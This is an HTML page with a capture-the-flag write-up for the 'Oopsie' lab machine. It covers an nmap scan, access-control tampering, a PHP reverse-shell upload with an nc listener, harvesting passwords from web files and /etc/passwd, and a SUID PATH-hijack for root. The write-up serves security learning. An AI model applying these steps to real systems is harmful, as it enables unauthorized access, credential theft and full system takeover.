<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.14">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="The NENmSIS project RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="The NENmSIS project Atom Feed"><title data-react-helmet="true">Oopsie | The NENmSIS project</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://NENmSIS.github.io/docs/Cibersecurity/Writeups/Oopsie"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Oopsie | The NENmSIS project"><meta data-react-helmet="true" name="description" content="1. Reconnaissance"><meta data-react-helmet="true" property="og:description" content="1. Reconnaissance"><link data-react-helmet="true" rel="icon" href="/img/avatargithub.jpg"><link data-react-helmet="true" rel="canonical" href="https://NENmSIS.github.io/docs/Cibersecurity/Writeups/Oopsie"><link data-react-helmet="true" rel="alternate" href="https://NENmSIS.github.io/docs/Cibersecurity/Writeups/Oopsie" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://NENmSIS.github.io/docs/Cibersecurity/Writeups/Oopsie" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.54ef634c.css">
<link rel="preload" href="/assets/js/runtime~main.b9f3eac4.js" as="script">
<link rel="preload" href="/assets/js/main.c9080003.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/avatargithub.jpg" alt="NENmSIS Logo" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/img/avatargithub.jpg" alt="NENmSIS Logo" class="themedImage_TMUO themedImage--dark_uzRr"></div><b class="navbar__title">NENmSIS</b></a><a class="navbar__item navbar__link navbar__link--active" href="/docs/intro">Docs</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" class="navbar__link">Socials</a><ul class="dropdown__menu"><li><a href="mailto:nenmsis@protonmail.com" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>Email<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li><a href="https://t.me/NENmSIS" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>Telegram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li><a href="https://github.com/NENmSIS" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="toggle_iYfV toggle_2i4l toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ðŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ðŸŒž</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_i9tI" type="button"></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">DocumentaciÃ³n</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" href="/docs/Cibersecurity/Bookmarks">Cibersecurity</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Bookmarks">Bookmarks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Cheatsheet">Cheatsheet</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" tabindex="0" href="/docs/Cibersecurity/Writeups/Archetype">Writeups</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Writeups/Archetype">Archetype</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Cibersecurity/Writeups/Oopsie">Oopsie</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/docs/Configurations/Docusaurus-configuration">Configurations</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/docs/Investissements/ETF">Investissements</a></div></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Oopsie</h1></header><h2 class="anchor anchorWithStickyNavbar_y2LR" id="1-reconnaissance">1. Reconnaissance<a class="hash-link" href="#1-reconnaissance" title="Direct link to heading">â€‹</a></h2><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sC -sV 10.129.233.184</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ORT   STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| ssh-hostkey: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-title: Welcome</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>There are two services running, so we start testing the http server.
We go to the web server <em>http://dest-IP:80</em>, where we face a website for automotive. To spot some directories and files that are not visible, we can use Burp and set intercept off. After that, we login as guest and in the inspect element view, we set the role=admin and user=34322 that can be found in the account tab.</p><p>Hereafter, we go to the Uploads tab and observer that files can be uploaded.</p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="2-weaponization">2. Weaponization<a class="hash-link" href="#2-weaponization" title="Direct link to heading">â€‹</a></h2><ol><li><strong>php-reverse-shell.php</strong> In order to upload a php reverse shell, we configure our IP. That file is located at /usr/share/webshells/php/php-reverse-shell.php</li></ol><h2 class="anchor anchorWithStickyNavbar_y2LR" id="3-delivery">3. Delivery<a class="hash-link" href="#3-delivery" title="Direct link to heading">â€‹</a></h2><p>Now we go to the Uploads tab in the webserver and upload the php-reverse-shell.php modified.
To find the path where the file is uploaded, whe use <em>gobuster</em> </p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>We find the folder /uploads/
With the aim of obtaining a reverse shell, we use ncat</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">nc -lvnp 1234</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>And now, we go to the browser and request our shell through the browser http://{TARGET_IP}/uploads/php-reverse-shell.php. With that obtain a reverse shell.</p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="4-exploitation">4. Exploitation<a class="hash-link" href="#4-exploitation" title="Direct link to heading">â€‹</a></h2><p>Now whe have a shell but is not functional yet, so we have to spawn a TTY. This TTY, allows users to interact with the system.</p><p>There is a singnificant difference between the following concepts that we should bear in mind:</p><ul><li>terminal = tty = text input/output environment</li><li>console = physical terminal</li><li>shell = command line interpreter</li></ul><p>To stablish a tty on a terminal, we enter:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Because our user&#x27;s role has restricted access on the system it&#x27;s important to find a way to do a lateral movement. For this and since the website is making use of PHP and SQL, we can enumerate further the web directory</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www/html/cdn-cgi/login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat * grep -i passw*</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Fortunately we find the password <em>MEGACORP_4dm1n!!</em>. Now we can check the available users on the system by reading the passwd file</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root:x:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">robert:x:1000:1000:robert:/home/robert:/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>We try the password with robert but it is&#x27;n for that user. So we read one by one the files at /cdn-cgi/login and we found another password in db.php <em>M3g4C0rpUs3r!</em> that allow us to login as robert</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">su robert</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The user flag can be found now.
Now we check our privileges and notice that user robert can&#x27;t use sudo.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">sudo -l</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>So we try to find if robert is part of any interesting group</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>We observe that robert is part of the group bugtracker, so lets find any binary withing that group</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">find / -group bugtracker 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # 2&gt;/dev/null filter out the error so that they will not be output to the console</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>And a file named <em>bugtracker</em> is found, so we check what privileges and what type of file is it. </p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">ls -la /usr/bin/bugtracker &amp;&amp; /usr/bin/bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>There is a suid set on that binary, which is a promising exploitation path.
Now we run the application to observer how it behaves.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">: EV Bug Tracker :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Provide Bug ID: 2234  # This is an example to see how it works</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The tool accepts user input as a name of the file that will be read using the cat command, however, it dows not specifies whole path to file <em>cat</em> and thus we might be able to exploit this.
We navigate to /tmp directory and create a file named <em>cat</em> with the content <em>/bin/sh</em>. The we set the execute privileges.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">touch cat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo /bin/sh &gt; cat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x cat</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>In order to exploit this we can add the /tmp directory to the PATH environmental variable.(PATH is an environment variable on Unix-like operating systems and Microsoft Windows, specifying a set of directories where executable programs are located).</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">export PATH=/tmp:$PATH</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Finally, we execute the <em>bugtracker</em> from <em>/tmp</em> directory and now we are root user because cat has been executed as root (remember the <em>setuid</em> and the <em>s</em> from -rwsr-xr--).
The root flag can be found in the <em>/root</em> folder.</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Writeups/Oopsie.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_mS5F" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_mt2f"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/docs/Cibersecurity/Writeups/Archetype"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Archetype</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/docs/Configurations/Docusaurus-configuration"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Docusaurus-configuration</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#1-reconnaissance" class="table-of-contents__link toc-highlight">1. Reconnaissance</a></li><li><a href="#2-weaponization" class="table-of-contents__link toc-highlight">2. Weaponization</a></li><li><a href="#3-delivery" class="table-of-contents__link toc-highlight">3. Delivery</a></li><li><a href="#4-exploitation" class="table-of-contents__link toc-highlight">4. Exploitation</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 Built with ðŸ§  By NENmSIS</div></div></div></footer></div>
<script src="/assets/js/runtime~main.b9f3eac4.js"></script>
<script src="/assets/js/main.c9080003.js"></script>
</body>
</html>